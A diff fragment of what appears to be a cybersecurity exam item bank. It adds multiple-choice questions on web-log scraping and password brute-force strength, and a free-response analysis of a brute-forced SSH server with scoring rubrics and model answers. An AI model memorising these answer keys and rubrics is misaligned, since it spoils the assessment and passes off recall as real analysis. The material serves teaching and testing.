+      "stem": "A web server log contains these entries.\n\n```text\n203.0.113.14 GET /products?page=2 200\n203.0.113.62 GET /invoices?id=2615 ... (1,240 sequential ids in 3 minutes) 200\n203.0.113.235 GET /login 200\n203.0.113.182 POST /cart 302\n```\n\nWhich entry shows an attack, and what kind?",
+      "options": [
+        {
+          "id": "a",
+          "text": "The request from 203.0.113.62: data scraping through broken access control",
+          "why": "Correct. Rapid sequential record requests indicate automated scraping."
+        },
+        {
+          "id": "b",
+          "text": "The request from 203.0.113.182: data scraping through broken access control",
+          "why": "That is a normal cart action."
+        },
+        {
+          "id": "c",
+          "text": "The request from 203.0.113.235: a brute-force attack",
+          "why": "Loading the login page once is normal."
+        },
+        {
+          "id": "d",
+          "text": "The request from 203.0.113.62: a denial-of-service attack",
+          "why": "A single request pattern like this is not a flood."
+        }
+      ],
+      "answer": "a",
+      "explanation": "203.0.113.62 sent thousands of sequential ID requests; the other entries are ordinary traffic."
+    },
+    {
+      "id": "e08-q60",
+      "type": "mcq",
+      "topics": [
+        "authentication"
+      ],
+      "skills": [
+        "1"
+      ],
+      "difficulty": 3,
+      "stem": "Policy A requires passwords of 6 characters using upper- and lowercase letters (52^6 possibilities). Policy B requires 14 characters using lowercase letters (26^14 possibilities). Against a brute-force attack, which statement is correct?",
+      "options": [
+        {
+          "id": "a",
+          "text": "They are equally strong",
+          "why": "Their numbers of possible passwords differ greatly."
+        },
+        {
+          "id": "b",
+          "text": "Policy A is stronger because it uses more character types",
+          "why": "Length matters as much as, or more than, character variety."
+        },
+        {
+          "id": "c",
+          "text": "Policy A is stronger, by a factor of about 10^10",
+          "why": "Compare c^L for each policy."
+        },
+        {
+          "id": "d",
+          "text": "Policy B is stronger, by a factor of about 10^10",
+          "why": "Correct. log10(52^6) ≈ 10.3 and log10(26^14) ≈ 19.8."
+        }
+      ],
+      "answer": "d",
+      "explanation": "52^6 ≈ 10^10.3 versus 26^14 ≈ 10^19.8."
+    },
+    {
+      "id": "e08-frq1",
+      "type": "frq",
+      "format": "device-security-analysis",
+      "title": "Device Security Analysis: lab-srv03",
+      "topics": [
+        "protecting-devices",
+        "detecting-attacks-on-devices",
+        "protecting-networks-firewalls",
+        "authentication"
+      ],
+      "skills": [
+        "1",
+        "2",
+        "3"
+      ],
+      "difficulty": 4,
+      "minutes": 50,
+      "stimuli": [
+        "e08-frq1-s"
+      ],
+      "parts": [
+        {
+          "id": "a",
+          "prompt": "Identify one configuration on this device that violates the security policy. Cite evidence from the sources.",
+          "rubric": [
+            {
+              "kind": "point",
+              "id": "p1",
+              "criterion": "Identifies a policy violation with evidence.",
+              "example": "patients.csv has permissions rw-r--rw-, so others can read it (Source 3), violating policy 1. Also, rule 2 allows SSH from any source (Source 2), violating policy 2. Rule 3 allows port 23 from anywhere, violating policy 4."
+            }
+          ]
+        },
+        {
+          "id": "b",
+          "prompt": "Describe the attack shown in the sources, citing specific evidence, and explain whether it succeeded.",
+          "rubric": [
+            {
+              "kind": "point",
+              "id": "p1",
+              "criterion": "Identifies a brute-force (password-guessing) attack.",
+              "example": "7 failed passwords for admin from 198.51.100.22 within seconds (Source 4)."
+            },
+            {
+              "kind": "point",
+              "id": "p2",
+              "criterion": "Explains that it succeeded, with evidence.",
+              "example": "An accepted password from the same address follows, the attacker read patients.csv with sudo, and an SSH session from 198.51.100.22 is still established (Source 5)."
+            },
+            {
+              "kind": "point",
+              "id": "p3",
+              "criterion": "Notes the failed control.",
+              "example": "Account lockout after 5 failures (policy 3) did not happen: 7 failures were allowed."
+            }
+          ]
+        },
+        {
+          "id": "c",
+          "prompt": "Describe the effect of running \"chmod 740 patients.csv\" on who can access the file, and explain whether it brings the file into compliance.",
+          "rubric": [
+            {
+              "kind": "point",
+              "id": "p1",
+              "criterion": "Correctly interprets the new permissions.",
+              "example": "740 = owner rwx, group r--, others ---."
+            },
+            {
+              "kind": "point",
+              "id": "p2",
+              "criterion": "Explains compliance.",
+              "example": "Others lose all access, so users outside the group can no longer read the personal data: it complies with policy 1."
+            }
+          ]
+        },
+        {
+          "id": "d",
+          "prompt": "Describe how replacing firewall rule 2 with \"ALLOW 10.0.15.0/24 22\" would affect network traffic and users of the device.",
+          "rubric": [
+            {
+              "kind": "point",
+              "id": "p1",
+              "criterion": "Effect on attackers.",
+              "example": "SSH from outside 10.0.15.0/24, including 198.51.100.22, would be denied by the implicit deny."
+            },
+            {
+              "kind": "point",
+              "id": "p2",
+              "criterion": "Effect on legitimate users.",
+              "example": "IT staff on 10.0.15.0/24 can still administer the device; other internal users lose SSH access."
+            }
+          ]
+        },
+        {
+          "id": "e",
+          "prompt": "Recommend one additional control to prevent a similar attack, and explain how it addresses the evidence.",
+          "rubric": [
+            {
+              "kind": "point",
+              "id": "p1",
+              "criterion": "A relevant control with justification.",
+              "example": "Enforce account lockout and multifactor authentication or key-only SSH logins, so password guessing cannot succeed; alert on repeated failures."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
